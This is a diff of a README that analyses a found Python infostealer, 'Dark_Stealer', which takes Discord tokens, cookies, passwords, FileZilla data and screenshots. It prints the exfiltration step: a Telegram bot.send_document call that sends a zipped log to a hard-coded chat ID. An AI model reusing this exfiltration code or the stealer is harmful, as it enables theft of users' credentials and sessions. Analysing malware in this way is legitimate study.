@@ -1,4 +1,4 @@
-# Dark_-tealer-V1.0-
+# Dark_Stealer-V1.0-
 While browsing the interent I found this unmarked python file packed away into a seperate folder trying to hides itself as a trojan. I looked into it and found exactly what it was aiming to do. The code is aiming to grab the users disocrd token and save it to the folder. The main executable likely sent the working discord tokens, cookies, and screenshots back to the owner of the malware. I found this all incredibly interesting so I decided to publish it all for you to see. It also seems to be posting to telegram as far as I can tell from the token included.
 
 ## Analysis
@@ -57,7 +57,9 @@ doc = 'D:\LOG.zip'
 bot.send_document(439184350, doc)
 ```
 This final snippet of code just tells it to grab everything its just got and to zip and send the file over via telegram. 
+### Concluison
+This is a scary piece of malware, it may be the future trends of malware not to aim for destruction such as something like wannacrypt or with simple qbots, but instead the mass amounts of data logged and sold on illegal markets. This simple 100+ lines of code tell it to not only steal your cookies, passwords, filezilla information, discord token, but to also take a screenshot.
 ## TOS
-I did not create this, in fact I dont know who created it. I merely found it while treasure hunting on the internet. Please do use this responsibly and don't abuse. This is all meant for educational purposes and if you use this you are breaking the law. Please keep this in mind feel free to email me.
+I did not create this, in fact I dont know who created it. I merely found it while treasure hunting on the internet. Please do use this responsibly and don't abuse. This is all meant for educational purposes and if you use this you are breaking the law. Please keep this in mind feel free to email me. Also I would highly suggest not running it since it still contains the token. 
 
 
